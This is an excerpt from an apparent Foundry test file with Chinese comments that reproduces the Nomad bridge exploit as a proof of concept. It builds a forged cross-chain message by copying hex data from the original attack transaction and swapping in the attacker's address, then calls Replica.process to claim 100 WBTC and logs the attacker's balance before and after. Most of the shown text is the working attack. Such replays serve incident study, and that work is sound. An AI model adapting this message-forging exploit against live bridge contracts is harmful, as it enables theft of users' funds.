...
// Nomad BridgeRouter Contract : https://etherscan.io/address/0x15fda9f60310d09fea54e3c99d1197dff5107248#code (Logic (At that time!))
//                               https://etherscan.io/address/0xe0db61ac718f502B485DEc66D013afbbE0B52F84#code (Logic (Currently!))
...
contract Attacker is Test {
    ...
    function testExploit() public {
        ...
        // 记录攻击前Attacker的WBTC余额
        emit log_named_decimal_uint(
            "Attacker WBTC Balance",
            WBTC.balanceOf(address(this)),
            8
        );
        console.log("Attacker claim 100 WBTC from NomadBridge...");

        // 那次攻击中链桥返回来100WBTC的交易哈希 Txhash : https://etherscan.io/tx/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460
        // 复制了txhash(0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460)当时传入的消息数据,但将接受代币的地址换为自己的了
        bytes
            memory msgP1 = hex"6265616d000000000000000000000000d3dfd3ede74e0dcebc1aa685e151332857efce2d000013d60065746800000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a3006574680000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c59903000000000000000000000000";
        bytes memory recvAddr = abi.encodePacked(address(this));
        bytes
            memory msgP2 = hex"00000000000000000000000000000000000000000000000000000002540be400e6e85ded018819209cfb948d074cb65de145734b5b0852e4a5db25cac2b8c39a";
        ...
        */
        ...
        bool success = Replica.process(_message);
        // 判断攻击是否成功
        require(success, "Exploit failed");

        // 记录攻击后Attacker的WBTC余额
        emit log_named_decimal_uint(
            "Attacker WBTC Balance",
            WBTC.balanceOf(address(this)),
            8
